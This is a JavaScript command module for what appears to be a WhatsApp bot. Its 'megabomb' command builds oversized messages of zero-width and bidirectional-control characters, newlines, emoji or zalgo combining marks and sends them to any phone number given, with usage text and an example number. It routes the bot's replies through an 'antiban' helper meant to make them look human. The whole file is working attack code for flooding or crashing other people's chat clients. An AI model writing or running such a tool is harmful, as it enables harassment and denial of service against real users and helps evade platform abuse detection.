'use strict';
const config  = require('../../config');
const antiban = require('../../utils/antiban');

const MODES = {
  unicode() {
    const c = ['\u200b','\u200c','\u200d','\u2060','\u200e','\u200f','\u202a','\u202b','\u202c','\u202d','\u202e'];
    let t = '';
    for (let i = 0; i < 60000; i++) t += c[i % c.length];
    return t;
  },
  newline() { return '\n'.repeat(2500); },
  emoji()   { return '💥'.repeat(5000); },
  zalgo() {
    const m = ['\u0300','\u0301','\u0302','\u0303','\u0304','\u0305','\u0306','\u0307','\u0308','\u0309','\u030a','\u030b','\u030c','\u030d','\u030e','\u030f'];
    let t = '';
    for (let i = 0; i < 300; i++) {
      t += 'A';
      for (let j = 0; j < 40; j++) t += m[(i + j) % m.length];
      t += ' ';
    }
    return t;
  },
};

module.exports = async (sock, msg, args, { jid }) => {
  const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
  const target = mentioned[0] || (args[0] ? args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null);
  if (!target) {
    return antiban.sendHuman(sock, jid, {
      text: `💣 *Megabomb*\n\nUsage: ${config.prefix}megabomb <number> [unicode|newline|emoji|zalgo]\nExample: ${config.prefix}megabomb 94771234567 zalgo`,
    }, { quoted: msg });
  }
  const mode = (args[1] || 'unicode').toLowerCase();
  const fn = MODES[mode] || MODES.unicode;
  const text = fn();
  await antiban.sendHuman(sock, jid, { text: `💣 Sending *${mode}* bomb (${text.length} chars)...` }, { quoted: msg });
  await sock.sendMessage(target, { text });
  await antiban.sendHuman(sock, jid, { text: `✅ ${mode} bomb delivered to @${target.split('@')[0]}`, mentions: [target] }, { quoted: msg });
};
